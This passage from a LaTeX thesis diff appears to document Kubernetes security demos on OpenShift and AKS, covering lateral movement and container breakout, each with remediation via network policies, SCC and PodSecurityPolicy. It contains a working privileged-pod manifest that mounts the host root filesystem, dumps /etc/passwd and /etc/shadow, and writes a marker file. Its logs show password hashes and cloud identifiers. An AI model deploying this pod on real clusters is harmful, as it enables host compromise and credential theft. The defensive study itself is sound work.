+You have access to the following projects and can switch between them with 'oc project <projectname>':
+
+    default
+    kube-public
+    kube-system
+    management-infra
+    openshift
+    openshift-infra
+    openshift-logging
+    openshift-node
+    openshift-sdn
+    openshift-web-console
+    other-team-deployment
+    sock-shop
+  * testuser
+
+Using project "testuser" on server "https://openshiftmaster.lgr.com:8443".
+[root@openshiftmaster ~]# oc adm pod-network isolate-projects sock-shop
+[root@openshiftmaster ~]# oc rsh network-utils
+# ./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
+MongoDB shell version v4.0.10
+connecting to: mongodb://172.30.2.17:27017/test?gssapiServiceName=mongodb
+2019-06-14T14:31:15.634+0000 E QUERY    [js] Error: couldn't connect to server 172.30.2.17:27017, connection attempt failed: SocketException: Error connecting to 172.30.2.17:27017 :: caused by :: Connection timed out :
+connect@src/mongo/shell/mongo.js:344:17
+@(connect):2:6
+exception: connect failed
+#
+\end{lstlisting}
+\fi
+LATERAL MOVEMENT AKS REMEDIATION COMMANDS
+
+\iffalse
+Mitigation needs CLUSTER REBUILD (needs advanced network config):
+https://docs.microsoft.com/en-us/azure/aks/configure-azure-cni#configure-networking---portal
+Create \& apply netpol:
+cat sock-shop-ingress-netpol.yaml
+kubectl apply -f sock-shop-ingress-netpol.yaml -n sock-shop
+kubectl describe netpol -n sock-shop
+Try again:
+kubectl get service -n sock-shop
+kubectl exec -it network-utils -- /bin/sh
+./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.81.32
+\fi
+
+LATERAL MOVEMENT AKS REMEDIATION DUMP
+\iffalse
+\begin{lstlisting}[
+lukas@Azure:~$ cat sock-shop-ingress-netpol.yaml
+kind: NetworkPolicy
+apiVersion: networking.k8s.io/v1
+metadata:
+  namespace: sock-shop
+  name: sock-shop-ingress-netpol
+spec:
+  podSelector:
+    matchLabels:
+  ingress:
+  - from:
+    - podSelector: {}
+lukas@Azure:~$ kubectl apply -f sock-shop-ingress-netpol.yaml -n sock-shop
+networkpolicy.networking.k8s.io/sock-shop-ingress-netpol configured
+lukas@Azure:~$ kubectl describe netpol -n sock-shop
+Name:         sock-shop-ingress-netpol
+Namespace:    sock-shop
+Created on:   2019-06-18 12:00:09 +0000 UTC
+Labels:       <none>
+Annotations:  kubectl.kubernetes.io/last-applied-configuration:
+                {"apiVersion":"networking.k8s.io/v1","kind":"NetworkPolicy","metadata":{"annotations":{},"name":"sock-shop-ingress-netpol","namespace":"so...
+Spec:
+  PodSelector:     <none> (Allowing the specific traffic to all pods in this namespace)
+  Allowing ingress traffic:
+    To Port: <any> (traffic allowed to all ports)
+    From:
+      PodSelector: <none>
+  Allowing egress traffic:
+    <none> (Selected pods are isolated for egress connectivity)
+  Policy Types: Ingress
+lukas@Azure:~$ kubectl get service -n sock-shop
+NAME           TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
+carts          ClusterIP   10.0.144.225   <none>        80/TCP         29m
+carts-db       ClusterIP   10.0.174.90    <none>        27017/TCP      29m
+catalogue      ClusterIP   10.0.243.165   <none>        80/TCP         29m
+catalogue-db   ClusterIP   10.0.60.122    <none>        3306/TCP       29m
+front-end      NodePort    10.0.255.214   <none>        80:30001/TCP   29m
+orders         ClusterIP   10.0.145.107   <none>        80/TCP         29m
+orders-db      ClusterIP   10.0.217.238   <none>        27017/TCP      29m
+payment        ClusterIP   10.0.91.69     <none>        80/TCP         29m
+queue-master   ClusterIP   10.0.219.119   <none>        80/TCP         29m
+rabbitmq       ClusterIP   10.0.202.131   <none>        5672/TCP       29m
+shipping       ClusterIP   10.0.118.47    <none>        80/TCP         29m
+user           ClusterIP   10.0.52.200    <none>        80/TCP         29m
+user-db        ClusterIP   10.0.81.32     <none>        27017/TCP      29m
+lukas@Azure:~$ kubectl exec -it network-utils -- /bin/sh
+# ./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.81.32
+MongoDB shell version v4.0.10
+connecting to: mongodb://10.0.81.32:27017/test?gssapiServiceName=mongodb
+2019-06-18T12:05:06.734+0000 E QUERY    [js] Error: couldn't connect to server 10.0.81.32:27017, connection attempt failed: SocketException: Error connecting to 10.0.81.32:27017 :: caused by :: Connection timedout :
+connect@src/mongo/shell/mongo.js:344:17
+@(connect):2:6
+exception: connect failed
+#
+\end{lstlisting}
+\fi
 \subsection{Demonstration with implemented security measures}
 
-TODO see powerpoint
+TODO move pics, listings from above here
 
 \subsection{Risk reassessment 1}
 
@@ -813,19 +1444,551 @@ TODO updated table of risk for ocp AND aks
 
 \section{Managing the risk of V08 - Container Breakout}
 %TODO: write out all from ppt with commands, pictures
+TODO this was done on AKS and OCP, but needed changes in default OCP settings to work.
 
 \subsection{Demonstrating the successful attack without security measures}
 
-TODO see powerpoint
+BREAKOUT DEMO OCP COMMANDS
+
+cat container_breakout.yaml
+
+oc apply -f container_breakout.yaml
+
+(wait until run through)
+
+oc logs breakout
+
+oc adm policy scc-review -z default -f container_breakout.yaml
+
+oc adm policy remove-scc-from-user privileged -z default
+
+oc adm policy scc-review -z default -f container_breakout.yaml
+
+(to add again: )
+oc adm policy add-scc-to-user privileged -z default
+
+CONTAINER BREAKOUT OCP TEXT DUMP
+\iffalse
+\begin{lstlisting}[
+
+[root@openshiftmaster ~]# cat container_breakout.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+    name: breakout
+spec:
+    containers:
+    - name: breakout
+      securityContext:
+        privileged: true
+      image: alpine
+      command: ["/bin/sh"]
+      args: ["-c",
+                'echo -e "        /etc/passwd of underlying node";
+                cat /mnt/rootnode/etc/passwd;
+                echo -e "-----------\n        /etc/shadow of underlying node";
+                cat /mnt/rootnode/etc/shadow;
+                echo -e "-----------\n        root directory of underlying node";
+                ls -la /mnt/rootnode/;
+                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
+                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
+                ls -la /mnt/rootnode/;
+                while true;
+                  do sleep 30;
+                done;'
+        ]
+      volumeMounts:
+      - name: root-volume
+        mountPath: /mnt/rootnode
+    volumes:
+    - name: root-volume
+      hostPath:
+        path: /
+[root@openshiftmaster ~]# oc apply -f container_breakout.yaml
+pod/breakout created
+[root@openshiftmaster ~]# oc logs breakout
+        /etc/passwd of underlying node
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+lgr:x:1000:1000:lgr:/home/lgr:/bin/bash
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+dockerroot:x:998:995:Docker User:/var/lib/docker:/sbin/nologin
+openshiftinstall:x:1001:1001::/home/openshiftinstall:/bin/bash
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+gluster:x:997:994:GlusterFS daemons:/run/gluster:/sbin/nologin
+-----------
+        /etc/shadow of underlying node
+root:$6$Psl5jPOS6J4iml1A$YZqVpcvzWBUz6x.h.YQ3PGw7SZ2jkYkln4hRSLE4NYkD2qdupVHTxKDZGfKm9mQQ59aMdtk2cwCctw4wr1Ue41::0:99999:7:::
+bin:*:17492:0:99999:7:::
+daemon:*:17492:0:99999:7:::
+adm:*:17492:0:99999:7:::
+lp:*:17492:0:99999:7:::
+sync:*:17492:0:99999:7:::
+shutdown:*:17492:0:99999:7:::
+halt:*:17492:0:99999:7:::
+mail:*:17492:0:99999:7:::
+operator:*:17492:0:99999:7:::
+games:*:17492:0:99999:7:::
+ftp:*:17492:0:99999:7:::
+nobody:*:17492:0:99999:7:::
+systemd-network:!!:18032::::::
+dbus:!!:18032::::::
+polkitd:!!:18032::::::
+sshd:!!:18032::::::
+postfix:!!:18032::::::
+lgr:$6$XIdEJyuVesw/j.wx$zwfe31D3HKwM8Iz9wkuuMqEGJLuBtnk547QnLuyJ3zS3gDGX2sAsn4xooDR5fSIbSctd81QFRpa5jZDMHlr4C.::0:99999:7:::
+ntp:!!:18033::::::
+dockerroot:!!:18033::::::
+openshiftinstall:$6$SiTDcnpB$y4qzzbyDeBYkG/1VM9Rdj2fTHcFaDItqtBS5uzSrVj0NBA1SFExCu1dO8aXLZgSpfMpOkqhFXNL8CaUDG8Fch1:18036:0:99999:7:::
+rpc:!!:18036:0:99999:7:::
+rpcuser:!!:18036::::::
+nfsnobody:!!:18036::::::
+gluster:!!:18036::::::
+-----------
+        root directory of underlying node
+total 32
+dr-xr-xr-x   17 root     root           236 Jun 13 14:34 .
+drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
+lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
+dr-xr-xr-x    4 root     root          4096 Jun 11 14:55 boot
+drwxr-xr-x   21 root     root          4160 Jun 13 14:35 dev
+drwxr-xr-x  103 root     root          8192 Jun 11 14:59 etc
+drwxr-xr-x    4 root     root            41 May 20 07:34 home
+-rw-r--r--    1 root     root          4868 May 16 15:15 less
+lrwxrwxrwx    1 root     root             7 May 16 14:59 lib -> usr/lib
+lrwxrwxrwx    1 root     root             9 May 16 14:59 lib64 -> usr/lib64
+drwxr-xr-x    2 root     root             6 Dec 14  2017 media
+drwxr-xr-x    2 root     root             6 Dec 14  2017 mnt
+drwxr-xr-x    3 root     root            17 May 21 07:42 opt
+dr-xr-xr-x  728 root     root             0 Jun 11 14:54 proc
+dr-xr-x---   11 root     root          4096 Jun  7 12:38 root
+drwxr-xr-x   37 root     root          1200 Jun 13 11:52 run
+lrwxrwxrwx    1 root     root             8 May 16 14:59 sbin -> usr/sbin
+drwxr-xr-x    2 root     root             6 Dec 14  2017 srv
+dr-xr-xr-x   13 root     root             0 Jun 11 14:54 sys
+drwxrwxrwt   14 root     root          4096 Jun 13 14:34 tmp
+drwxr-xr-x   13 root     root           155 May 16 14:59 usr
+drwxr-xr-x   20 root     root           282 May 20 08:00 var
+-----------
+        root directory of underlying node after manipulation through this container
+total 32
+dr-xr-xr-x   17 root     root           275 Jun 13 14:35 .
+drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
+-rw-r--r--    1 root     root             0 Jun 13 14:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
+lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
+dr-xr-xr-x    4 root     root          4096 Jun 11 14:55 boot
+drwxr-xr-x   21 root     root          4160 Jun 13 14:35 dev
+drwxr-xr-x  103 root     root          8192 Jun 11 14:59 etc
+drwxr-xr-x    4 root     root            41 May 20 07:34 home
+-rw-r--r--    1 root     root          4868 May 16 15:15 less
+lrwxrwxrwx    1 root     root             7 May 16 14:59 lib -> usr/lib
+lrwxrwxrwx    1 root     root             9 May 16 14:59 lib64 -> usr/lib64
+drwxr-xr-x    2 root     root             6 Dec 14  2017 media
+drwxr-xr-x    2 root     root             6 Dec 14  2017 mnt
+drwxr-xr-x    3 root     root            17 May 21 07:42 opt
+dr-xr-xr-x  728 root     root             0 Jun 11 14:54 proc
+dr-xr-x---   11 root     root          4096 Jun  7 12:38 root
+drwxr-xr-x   37 root     root          1200 Jun 13 11:52 run
+lrwxrwxrwx    1 root     root             8 May 16 14:59 sbin -> usr/sbin
+drwxr-xr-x    2 root     root             6 Dec 14  2017 srv
+dr-xr-xr-x   13 root     root             0 Jun 11 14:54 sys
+drwxrwxrwt   14 root     root          4096 Jun 13 14:34 tmp
+drwxr-xr-x   13 root     root           155 May 16 14:59 usr
+drwxr-xr-x   20 root     root           282 May 20 08:00 var
+\end{lstlisting}
+\fi
+CONTAINER BREAKOUT OCP RESULT DUMP
+\iffalse
+\begin{lstlisting}[
+[root@openshiftworker ~]# ls -la /
+total 32
+dr-xr-xr-x.  17 root root  275 Jun 13 16:35 .
+dr-xr-xr-x.  17 root root  275 Jun 13 16:35 ..
+-rw-r--r--.   1 root root    0 Jun 13 16:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
+lrwxrwxrwx.   1 root root    7 May 16 16:59 bin -> usr/bin
+dr-xr-xr-x.   4 root root 4096 Jun 11 16:55 boot
+drwxr-xr-x.  21 root root 4160 Jun 13 16:35 dev
+drwxr-xr-x. 103 root root 8192 Jun 11 16:59 etc
+drwxr-xr-x.   4 root root   41 May 20 09:34 home
+-rw-r--r--.   1 root root 4868 May 16 17:15 less
+lrwxrwxrwx.   1 root root    7 May 16 16:59 lib -> usr/lib
+lrwxrwxrwx.   1 root root    9 May 16 16:59 lib64 -> usr/lib64
+drwxr-xr-x.   2 root root    6 Dec 14  2017 media
+drwxr-xr-x.   2 root root    6 Dec 14  2017 mnt
+drwxr-xr-x.   3 root root   17 May 21 09:42 opt
+dr-xr-xr-x. 727 root root    0 Jun 11 16:54 proc
+dr-xr-x---.  11 root root 4096 Jun  7 14:38 root
+drwxr-xr-x.  37 root root 1200 Jun 13 13:52 run
+lrwxrwxrwx.   1 root root    8 May 16 16:59 sbin -> usr/sbin
+drwxr-xr-x.   2 root root    6 Dec 14  2017 srv
+dr-xr-xr-x.  13 root root    0 Jun 11 16:54 sys
+drwxrwxrwt.  14 root root 4096 Jun 13 16:34 tmp
+drwxr-xr-x.  13 root root  155 May 16 16:59 usr
+drwxr-xr-x.  20 root root  282 May 20 10:00 var
+\end{lstlisting}
+\fi
+CONTAINER BREAKOUT AKS PREPARATION - SSH TO NODE
+\iffalse
+\begin{lstlisting}[
+CLUSTER_RESOURCE_GROUP=$(az aks show --resource-group kubernetes-ba-test --name demo-cluster-LGR --query nodeResourceGroup -o tsv)
+az vm list-ip-addresses --resource-group $CLUSTER_RESOURCE_GROUP -o table
+kubectl run -it --rm aks-ssh --image=debian
+apt-get update && apt-get install openssh-client –y
+(other shell) 
+kubectl get pods
+kubectl cp ~/.ssh/id_rsa [POD_NAME_HERE]:/id_rsa
+chmod 0600 id_rsa
+ssh -i id_rsa azureuser@[NODE_IP_HERE]
+\end{lstlisting}
+\fi
+CONTAINER BREAKOUT AKS COMMANDS
+
+cat container_breakout.yaml
+
+kubectl apply -f container_breakout.yaml
+
+(wait until run through)
+
+kubectl logs breakout
+
+CONTAINER BREAKOUT AKS TEXT DUMP
+\iffalse
+\begin{lstlisting}[
+lukas@Azure:~$ cat container_breakout.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+    name: breakout
+spec:
+    containers:
+    - name: breakout
+      securityContext:
+        privileged: true
+      image: alpine
+      command: ["/bin/sh"]
+      args: ["-c",
+                'echo -e "        /etc/passwd of underlying node";
+                cat /mnt/rootnode/etc/passwd;
+                echo -e "-----------\n        /etc/shadow of underlying node";
+                cat /mnt/rootnode/etc/shadow;
+                echo -e "-----------\n        root directory of underlying node";
+                ls -la /mnt/rootnode/;
+                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
+                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
+                ls -la /mnt/rootnode/;
+                while true;
+                  do sleep 30;
+                done;'
+        ]
+      volumeMounts:
+      - name: root-volume
+        mountPath: /mnt/rootnode
+    volumes:
+    - name: root-volume
+      hostPath:
+        path: /
+lukas@Azure:~$ kubectl apply -f container_breakout.yaml
+pod/breakout created
+lukas@Azure:~$ kubectl logs breakout
+        /etc/passwd of underlying node
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+unscd:x:112:116::/var/lib/unscd:/bin/false
+statd:x:113:65534::/var/lib/nfs:/bin/false
+ceph:x:64045:64045:Ceph storage service:/var/lib/ceph:/bin/false
+azureuser:x:1001:1001:Ubuntu:/home/azureuser:/bin/bash
+-----------
+        /etc/shadow of underlying node
+root:$6$w9SIk+c=$7K7HDrrDDXXK.ybne04PZ2coDScUlQv4Vx6YkscDlhKkka5YWMmUEoPiTsmarCssQr1CCm2NqLzdKaaIXrI04/:18039:0:99999:7:::
+daemon:*:18030:0:99999:7:::
+bin:*:18030:0:99999:7:::
+sys:*:18030:0:99999:7:::
+sync:*:18030:0:99999:7:::
+games:*:18030:0:99999:7:::
+man:*:18030:0:99999:7:::
+lp:*:18030:0:99999:7:::
+mail:*:18030:0:99999:7:::
+news:*:18030:0:99999:7:::
+uucp:*:18030:0:99999:7:::
+proxy:*:18030:0:99999:7:::
+www-data:*:18030:0:99999:7:::
+backup:*:18030:0:99999:7:::
+list:*:18030:0:99999:7:::
+irc:*:18030:0:99999:7:::
+gnats:*:18030:0:99999:7:::
+nobody:*:18030:0:99999:7:::
+systemd-timesync:*:18030:0:99999:7:::
+systemd-network:*:18030:0:99999:7:::
+systemd-resolve:*:18030:0:99999:7:::
+systemd-bus-proxy:*:18030:0:99999:7:::
+syslog:*:18030:0:99999:7:::
+_apt:*:18030:0:99999:7:::
+lxd:*:18030:0:99999:7:::
+messagebus:*:18030:0:99999:7:::
+uuidd:*:18030:0:99999:7:::
+dnsmasq:*:18030:0:99999:7:::
+sshd:*:18030:0:99999:7:::
+pollinate:*:18030:0:99999:7:::
+unscd:*:18031:0:99999:7:::
+statd:*:18039:0:99999:7:::
+ceph:*:18039:0:99999:7:::
+azureuser:!:18064:7:90:7:30::
+-----------
+        root directory of underlying node
+total 100
+drwxr-xr-x   23 root     root          4096 Jun 17 12:59 .
+drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
+-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
+drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
+drwxr-xr-x    3 root     root          4096 Jun 17 07:58 boot
+drwxr-xr-x   16 root     root          3760 Jun 17 07:56 dev
+drwxr-xr-x  104 root     root          4096 Jun 17 07:58 etc
+drwxr-xr-x    3 root     root          4096 Jun 17 07:56 home
+lrwxrwxrwx    1 root     root            33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
+lrwxrwxrwx    1 root     root            33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
+drwxr-xr-x   21 root     root          4096 May 23 18:49 lib
+drwxr-xr-x    2 root     root          4096 May 14 21:21 lib64
+drwx------    2 root     root         16384 May 14 21:29 lost+found
+drwxr-xr-x    2 root     root          4096 May 14 21:20 media
+drwxr-xr-x    3 root     root          4096 Jun 17 07:56 mnt
+drwxr-xr-x    5 root     root          4096 Jun 17 07:56 opt
+dr-xr-xr-x  221 root     root             0 Jun 17 07:55 proc
+drwx------    3 root     root          4096 May 23 18:46 root
+drwxr-xr-x   31 root     root          1460 Jun 17 13:02 run
+drwxr-xr-x    2 root     root         12288 Jun 17 07:58 sbin
+drwxr-xr-x    2 root     root          4096 May 23 18:46 snap
+drwxr-xr-x    2 root     root          4096 May 14 21:20 srv
+dr-xr-xr-x   12 root     root             0 Jun 17 12:29 sys
+drwxrwxrwt    8 root     root          4096 Jun 17 13:02 tmp
+drwxr-xr-x   11 root     root          4096 May 23 18:49 usr
+drwxr-xr-x   14 root     root          4096 May 23 19:05 var
+lrwxrwxrwx    1 root     root            30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
+lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
+-----------
+        root directory of underlying node after manipulation through this container
+total 100
+drwxr-xr-x   23 root     root          4096 Jun 17 13:02 .
+drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
+-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
+-rw-r--r--    1 root     root             0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
+drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
+drwxr-xr-x    3 root     root          4096 Jun 17 07:58 boot
+drwxr-xr-x   16 root     root          3760 Jun 17 07:56 dev
+drwxr-xr-x  104 root     root          4096 Jun 17 07:58 etc
+drwxr-xr-x    3 root     root          4096 Jun 17 07:56 home
+lrwxrwxrwx    1 root     root            33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
+lrwxrwxrwx    1 root     root            33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
+drwxr-xr-x   21 root     root          4096 May 23 18:49 lib
+drwxr-xr-x    2 root     root          4096 May 14 21:21 lib64
+drwx------    2 root     root         16384 May 14 21:29 lost+found
+drwxr-xr-x    2 root     root          4096 May 14 21:20 media
+drwxr-xr-x    3 root     root          4096 Jun 17 07:56 mnt
+drwxr-xr-x    5 root     root          4096 Jun 17 07:56 opt
+dr-xr-xr-x  221 root     root             0 Jun 17 07:55 proc
+drwx------    3 root     root          4096 May 23 18:46 root
+drwxr-xr-x   31 root     root          1460 Jun 17 13:02 run
+drwxr-xr-x    2 root     root         12288 Jun 17 07:58 sbin
+drwxr-xr-x    2 root     root          4096 May 23 18:46 snap
+drwxr-xr-x    2 root     root          4096 May 14 21:20 srv
+dr-xr-xr-x   12 root     root             0 Jun 17 12:29 sys
+drwxrwxrwt    8 root     root          4096 Jun 17 13:02 tmp
+drwxr-xr-x   11 root     root          4096 May 23 18:49 usr
+drwxr-xr-x   14 root     root          4096 May 23 19:05 var
+lrwxrwxrwx    1 root     root            30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
+lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
+\end{lstlisting}
+\fi
+CONTAINER BREAKOUT AKS RESULT DUMP
+\iffalse
+\begin{lstlisting}[
+\fi
+
+azureuser@aks-agentpool-35206649-1:~$ ls -la /
+total 100
+drwxr-xr-x  23 root root  4096 Jun 17 13:02 .
+drwxr-xr-x  23 root root  4096 Jun 17 13:02 ..
+-rw-r--r--   1 root root     0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
+drwxr-xr-x   2 root root  4096 May 23 18:48 bin
+drwxr-xr-x   3 root root  4096 Jun 17 07:58 boot
+drwxr-xr-x  16 root root  3760 Jun 17 07:56 dev
+drwxr-xr-x 104 root root  4096 Jun 17 07:58 etc
+drwxr-xr-x   3 root root  4096 Jun 17 07:56 home
+lrwxrwxrwx   1 root root    33 Jun 17 07:58 initrd.img -> boot/initrd.img-4.15.0-1046-azure
+lrwxrwxrwx   1 root root    33 May 15 03:24 initrd.img.old -> boot/initrd.img-4.15.0-1045-azure
+drwxr-xr-x  21 root root  4096 May 23 18:49 lib
+drwxr-xr-x   2 root root  4096 May 14 21:21 lib64
+drwx------   2 root root 16384 May 14 21:29 lost+found
+drwxr-xr-x   2 root root  4096 May 14 21:20 media
+drwxr-xr-x   3 root root  4096 Jun 17 07:56 mnt
+drwxr-xr-x   5 root root  4096 Jun 17 07:56 opt
+dr-xr-xr-x 221 root root     0 Jun 17 07:55 proc
+-rw-------   1 root root  1024 Jun 17 07:56 .rnd
+drwx------   3 root root  4096 May 23 18:46 root
+drwxr-xr-x  31 root root  1460 Jun 17 13:02 run
+drwxr-xr-x   2 root root 12288 Jun 17 07:58 sbin
+drwxr-xr-x   2 root root  4096 May 23 18:46 snap
+drwxr-xr-x   2 root root  4096 May 14 21:20 srv
+dr-xr-xr-x  12 root root     0 Jun 17 12:29 sys
+drwxrwxrwt   8 root root  4096 Jun 17 13:06 tmp
+drwxr-xr-x  11 root root  4096 May 23 18:49 usr
+drwxr-xr-x  14 root root  4096 May 23 19:05 var
+lrwxrwxrwx   1 root root    30 Jun 17 07:58 vmlinuz -> boot/vmlinuz-4.15.0-1046-azure
+lrwxrwxrwx   1 root root    30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
+\end{lstlisting}
 
 \subsection{Selecting security measures}
 
-TODO use multitenant network plugin (ocp), networkpolicies (aks)
+TODO dont allow privileged containers (scc in OCP, podsecuritypolicies in AKS)
 
+
+CONTAINER BREAKOUT OCP REMEDIATION DUMP
+\iffalse
+\begin{lstlisting}[
+[root@openshiftmaster ~]# oc adm policy scc-review -z default -f container_breakout.yaml
+RESOURCE       SERVICE ACCOUNT   ALLOWED BY
+Pod/breakout   default           privileged
+[root@openshiftmaster ~]# oc adm policy remove-scc-from-user privileged -z default
+scc "privileged" removed from: ["system:serviceaccount:testuser:default"]
+[root@openshiftmaster ~]# oc adm policy scc-review -z default -f container_breakout.yaml
+RESOURCE   SERVICE ACCOUNT   ALLOWED BY
+\end{lstlisting}
+\fi
+CONTAINER BREAKOUT AKS REMEDIATION CMDs
+
+Enable PSP on the cluster:
+az aks update --resource-group kubernetes-ba-test --name demo-cluster-LGR --enable-pod-security-policy
+Create (non-admin) account:
+kubectl create serviceaccount --namespace testuser nonadmin-user
+kubectl create rolebinding --namespace testuser nonadmin-rolebinding --clusterrole=edit --serviceaccount=testuser:nonadmin-user
+Delete \& (try) redeploy breakout container (as non-admin):
+kubectl delete pod breakout
+kubectl --as=system:serviceaccount:testuser:nonadmin-user apply -f container_breakout.yaml
+(OPTIONAL: Check why - Kubectl get psp)
+
+CONTAINER BREAKOUT AKS REMEDIATION DUMP
+\iffalse
+\begin{lstlisting}[
+lukas@Azure:~$ kubectl get pods
+NAME            READY   STATUS    RESTARTS   AGE
+network-utils   1/1     Running   0          17m
+lukas@Azure:~$ az aks update --resource-group kubernetes-ba-test --name demo-cluster-LGR --enable-pod-security-policy
+{
+  "aadProfile": null,
+  "addonProfiles": {
+    "httpApplicationRouting": {
+      "config": null,
+      "enabled": false
+    }
+  },
+  "agentPoolProfiles": [
+    {
+      "availabilityZones": null,
+      "count": 2,
+      "enableAutoScaling": null,
+      "maxCount": null,
+      "maxPods": 30,
+      "minCount": null,
+      "name": "agentpool",
+      "orchestratorVersion": "1.11.9",
+      "osDiskSizeGb": 100,
+      "osType": "Linux",
+      "provisioningState": "Succeeded",
+      "type": "AvailabilitySet",
+      "vmSize": "Standard_DS2_v2",
+      "vnetSubnetId": "/subscriptions/fe1ae95c-b0ef-4525-8b1c-d44e763a90e6/resourceGroups/kubernetes-ba-test/providers/Microsoft.Network/virtualNetworks/kubernetes-ba-test-vnet/subnets/default"
+    }
+  ],
+  "apiServerAuthorizedIpRanges": null,
+  "dnsPrefix": "demo-cluster-LGR-dns",
+  "enablePodSecurityPolicy": true,
+  "enableRbac": true,
+  "fqdn": "demo-cluster-lgr-dns-7d796dfe.hcp.northeurope.azmk8s.io",
+  "id": "/subscriptions/fe1ae95c-b0ef-4525-8b1c-d44e763a90e6/resourcegroups/kubernetes-ba-test/providers/Microsoft.ContainerService/managedClusters/demo-cluster-LGR",
+  "identity": null,
+  "kubernetesVersion": "1.11.9",
+  "linuxProfile": null,
+  "location": "northeurope",
+  "maxAgentPools": 1,
+  "name": "demo-cluster-LGR",
+  "networkProfile": {
+    "dnsServiceIp": "10.0.0.10",
+    "dockerBridgeCidr": "172.17.0.1/16",
+    "loadBalancerSku": "basic",
+    "networkPlugin": "azure",
+    "networkPolicy": null,
+    "podCidr": null,
+    "serviceCidr": "10.0.0.0/16"
+  },
+  "nodeResourceGroup": "MC_kubernetes-ba-test_demo-cluster-LGR_northeurope",
+  "provisioningState": "Succeeded",
